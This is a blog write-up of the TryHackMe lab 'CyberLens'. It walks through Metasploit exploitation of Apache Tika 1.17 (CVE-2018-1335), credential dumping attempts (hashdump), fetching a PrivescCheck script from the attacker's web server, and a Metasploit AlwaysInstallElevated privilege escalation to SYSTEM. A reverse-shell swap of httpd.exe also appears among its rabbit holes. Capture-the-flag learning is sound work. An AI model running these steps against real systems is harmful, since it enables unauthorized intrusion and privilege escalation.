---
title: "CyberLens TryHackMe Writeup"
published: 2024-05-24T12:05:12+10:00
lastUpdated: 2024-05-24T12:05:12+10:00
url: cyberlens
alias: # aliases for multiple
    - cyberLens-tryHackMe-writeup
    - 

cover:
    image: "https://i.imgur.com/zfu4dRJ_d.webp?maxwidth=1520&fidelity=grand"
    # alt: "<alt text>"
    # caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles 

type: post # letter, note, page
categories: Writeup # Homelab, Writeup, Personal
tags:
    - TryHackMe
    - Writeup

draft: false

# ShowToc: false
# TocOpen: false

# searchHidden: true # Make false to hide page from search
---

Okay, it's been a while. Last writeup on the blog was [Chill Hack](https://mrash.co/chill-hack/)... but she (and others) need refreshers.

Anyway, here's [CyberLens](https://tryhackme.com/r/room/cyberlensp6), a newish TryHackMe room from [Tyler Ramsbey](https://www.youtube.com/@TylerRamsbey) who make's great content, give them a follow/subscribe.

PS - I've got a [video walkthrough](https://youtu.be/Gmhhv1b3xEE) if you want.

## The Challenge

First up, the Challenge Description.

```plain-text
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags?
```

I thought this room might be more 'image forensics' related, but I guess that's just the law of this CyberLens company.

Tyler, is the description AI generated? It's okay if it is, no shame, just curious. 

[UPDATE] Yes, it's AI. Tyler mentions it in his [Official Walkthrough](https://youtu.be/eFWEwS5thu4?si=ptGJISHJlWbWGAWD).

There's **Things to Note** which is nice. 

Add the `MACHINE_IP` to `/etc/hosts/` and wait 5 minutes. Done.

But the focus are two flags. 1) User, and 2) Administrator. 

A familiar room challenge. 

Perfect for me to get back into things. 

Let's go.

## Enumeration

Typically `rustscan` or `nmap` are normal starting points.

But since the description finished with "Can you exploit the CyberLens **web server** and discover the hidden flags?"

It's easier to start on port 80 via cyberlens[.]thm.

![CyberLens Website](https://i.imgur.com/Xjb7qCZ.jpeg)

With a quick look at WhatRuns and Wappalyzer, seems like an Apache Server running a basic html/css template on Bootstrap.

Also it's on a Windows Server, good to know for later.

![Wappalyzer](https://i.imgur.com/1iT4X3m.png)

Nothing too interesting until scrolling down and seeing a form.

![CyberLens Website Form](https://i.imgur.com/9ZHgSAR.png)

And with a quick view-source, we've got an interesting end-point.

![Web Form Showing Port 61777](https://i.imgur.com/0DFddsE.png)

Since the web form is fetching via 'http', perhaps we can see via the browser?

![Apache Tika](https://i.imgur.com/hqOId3k.png)

Ah, an Apache service with a version number. Interesting.

So, from searching **Apache Tika** it's a **toolkit (that) detects and extracts metadata** from file types like PDFs etc.

This feeds into the CyberLens description from earlier.

And from searching **Apache Tika 1.17 Exploit** we've got our *in*.

![Apache Tika 1.17 Exploit](https://i.imgur.com/1fWQ7ot.png)

So it's originally [CVE-2018-1335](https://nvd.nist.gov/vuln/detail/CVE-2018-1335) where a vulnerability "could be used to inject commands into the command line of the server running tika-server."

We can also use `searchsploit tika 1.17` if that's your cup of tea.

Looks like we have a Metasploit exploit ready to go, lovely.

## Initial Access

Okay, let's fire up this bad boy and see what we've got.

Use `msfconsole -q` and then `search tika` to find our exploit.

It's `exploit/windows/http/apache_tika_jp2_jscript` or type `use 0` when it's the first search item.

Set the following options with `set $option $value`:
- `set RHOSTS $MACHINE_IP`
- `set RPORT 61777`
- `set LHOST $YOUR_IP`

And then use `run` or `go` when you're ready.

The user flag hint **Sometimes exploits take a few tries before they are successful ;)** comes in here.

You may need to try this once or twice to get it working. Double check your options are correct.

When the exploit works and a sessions created, you'll see:

![Metasploit Tika Exploit Session](https://i.imgur.com/fybpy7B.png)

We're in.

So who are we?

A quick `whoami` and we're user `cyberlens`.

Since we're in Meterpreter, there are extra luxuries, like:
- `sysinfo` for some system background.
- `getsystem` for a quick priv esc attempt... no luck there.
- `hashdump` for a sneaky SAM database dump... again, no luck.

Worth a try.

Otherwise, let's look around. Do what the kids call 'manual enumeration'.

We can drop a shell on the system using `shell` and then enter PowerShell with `powershell`.

![Meterpreter Shell To PowerShell](https://i.imgur.com/vGEq0YN.png)

Let's see some info about what we can do:
- `whoami /priv`
- `whoami /all`

![whoami priv and whoami all](https://i.imgur.com/YVc1k6n.png)

If you're like me, there's a few rabbit holes to explore.

What's `SeChangeNotifyPrivilege`? Does it give me anything? After a quick Google, nope.

Let's look around then.

Some good places to check are:
- `C:\`
- `C:\Users`
- `C:\Windows\Temp`

Since we're in PowerShell, use `ls` or `gci` to list out contents. 

(Oh PowerShell, your commands are so simple to remember.)

For example, `cd C:\Users\CyberLens` and `gci -recurse .`

![Recursive User Files](https://i.imgur.com/8WqfJFa.png)

Interesting, the `user.txt`, and a `CyberLens-Management.txt`

![Displaying User Flag and CyberLens Credentials](https://i.imgur.com/cKWW22f.png)

Alright, now we have some credentials: `CyberLens:H************3`

## Privilege Escalation

I'll be honest. I got stuck here, like really stuck.

The *hint* didn't help **RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389**.

For me, sticking with PowerShell was the way to go.

But after a few rabbit holes, I took a step back and watched [Windows Privilege Escalation Guide](https://youtu.be/w3v_ydcw3T4?si=llF_n2L0og3RkSon).

Which led to a new (for me) script called [PrivesCheck](https://github.com/itm4n/PrivescCheck).

![Download PrivescCheck Script](https://i.imgur.com/kWKbJc2.png)

If you're following along at home.

Start a Python Web Server with `python -m http.server 8000` where you download the script. 

![Transfer PrivescCheck Script](https://i.imgur.com/6LhBV1v.png)

Then on the Target Machine, put the script where you have write permissions. Like the Desktop or Temp.

You can use `wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file` in PowerShell.

Go ahead and run the script `. .\PrivescCheck.ps1; Invoke-PrivescCheck`

Gotta say, I do like the output of PrivescCheck. An easy-to-digest summary is nice.

![PrivescCheck Summary](https://i.imgur.com/k4wFGdl.png)

So what's `AlwaysInstallElevated`?

Basically, it allows lower level users to install Windows Packages with system level privileges.

You see where this is going?

And luckily, [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) has more info about it.

Would you look at that?

There's another metasploit exploit ready to rock for us. Lovely.

Exit PowerShell and go back to Meterpreter with `exit` and `exit`.

Then `bg` that session and type `use exploit/windows/local/always_install_elevated`.

![AlwaysInstallElevated Exploit](https://i.imgur.com/QWhWeN3.png)

Set the `options` for the exploit and `run`:
- `set LHOST $YOUR_IP`
- `set SESSION 1`

![AlwaysInstallElevated Exploit Options](https://i.imgur.com/iaY5jiw.png)

And look at that, `authority\system` user.

It's as good as being root on Linux... I think.

![AlwaysInstallElevated Exploit Running](https://i.imgur.com/LfNUgUb.png)

Then `cat C:\Users\Administrator\Desktop\admin.txt` for the admin flag.

![Admin Flag](https://i.imgur.com/RQWAVPO.png)

## Reflection & Rabbit Holes

CyberLens has been great, props to Tyler and TryHackMe.

It's Easy rated, but the priv esc portion stumped me.

I went down a few Rabbit Holes:
- RDP led me replacing `C:\Apache24\bin\httpd.exe` with a reverse shell. Then using a startup.bat which using a Visual Basics script to run `httpd.exe`.
- I thought I found a **Windows 17763** exploit on **exploit.db**... nope. 
- Then I followed [Windows 11 Privilege Escalation via UAC Bypass (GUI based)](https://www.pwndefend.com/2021/08/23/windows-11-privilege-escalation-via-uac-bypass-gui-based/)... again, nope.

Since I have more Linux priv esc experience, this was a good room for me. I need to sharpen my Windows priv esc skills up, a lot.

Some key takeaways:
- Metasploit makes things easier. It'd be good to do this room again without using it though. Push myself a bit.
- Research is king. I spent more time reading up about services and vulnerabilities. Even though I went down rabbit holes, I learned more.
- Stay calm and take breaks. I've rushed rooms to push content out in the past. Instead I took my time and just focused on learning.

Thanks again to Tyler and TryHackMe. 

I'm already on my next room.

Subscribe to the (not so) Monthly Monitor below.

Thanks for reading.

PS - oh hey, you're still here? Why not watch the video walkthough?

{{< youtube Gmhhv1b3xEE >}}
